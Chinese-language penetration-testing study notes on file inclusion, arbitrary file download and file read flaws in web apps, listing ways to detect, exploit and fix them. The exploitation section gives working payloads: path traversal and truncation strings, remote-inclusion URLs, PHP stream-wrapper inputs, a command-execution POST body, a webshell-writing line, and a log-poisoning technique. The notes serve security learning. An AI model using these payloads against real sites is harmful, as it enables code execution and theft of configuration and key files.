## 文件操作安全：

文件上传

文件包含（将文件以脚本执行）：
```
脚本（各种包含函数）：ASP，PHP，JSP，ASPX，Python，Javaweb
检测：白盒（代码审计），黑盒（漏扫工具，公开漏洞，手工看参数值及功能点）
类型：本地包含（无限制和有限制），远程包含（无限制和有限制）
利用：http，ftp，file，各种脚本支持协议
修复：固定后缀，固定文件，WAF产品
```

文件下载

文件读取



### 本地包含：
```
include.php?filename=1.txt
include.php?filename=../../../www.txt
%00截断：条件：magic_quotes_gpc=Off，php版本<5.3.4
filename=../../../www.txt%00
长度截断：条件：windows，点号长于256，Linux长于4096
长度截断示例：filename=1.txt/./././././././././././././././././……./././././
或者filename=1.txt...........................……......

远程包含：
filename=http://www.xxx.com/readme.txt
filename=http://www.xxx.com/readme.txt%20
filename=http://www.xxx.com/readme.txt%23
filename=http://www.xxx.com/readme.txt?

各种协议流玩法：
参考：https://www.cnblogs.com/endust/p/11804767.html
filename=php://filter/convert.base64-encode/resource=1.txt
filename=php://input
Post:<?php system('whoami')?>
<?PHP fputs(fopen('x.php','w'),'<?php @eval(phpinfo();)?>');?>
filename=file:///D:/phpstudy/PHPTutorial/WWW/1.txt
filename=data://text/plain,
<?php%20phpinfo();?>
```

本地文件包含的一个思路：

在没有上传文件功能的情况下

如果是白盒，也就是知道对方日志文件路径的时候

可以通过错误访问把恶意代码写到对方日志里

然后利用文件包含漏洞将日志作为代码执行

本地文件包含的特点是只能包含目标站点上的文件

因此如果不能上传文件，就只能考虑是否存在可以修改的文件

比如说日志



### 文件下载：

产生：任意语言代码下载功能函数

检测：白盒（代码审计），黑盒（漏扫工具，公开漏洞，手工看参数值及功能点-比如资源下载）

利用：常见文件（后台首页日志等可见文件），敏感文件（数据库配置文件，各种接口文件，密钥信息等文件）

修复：部署WAF产品，固定目录或过滤跨目录符号，目录权限设置或单独文件权限设置

文件读取：

产生：任意语言代码获取功能函数

检测：手工看参数值及功能点（资源获取）



### 判断：
文件被解析，则是文件包含漏洞

显示源代码，则是文件读取漏洞

提示文件下载，则是文件下载漏洞

关于目录：被操作的文件不一定与操作它的脚本文件在同一个目录

因此有时`xxx.php?filename=xxx.php`是无法成功的，可能此时其实是在pic之类的目录里面

因此需要确定要访问的文件实际存在的目录

比如说`xxx.php?filename=../../script/xxx.php`

很多时候文件下载等操作是通过POST方式传参的

多观察POST体，多用hackbar

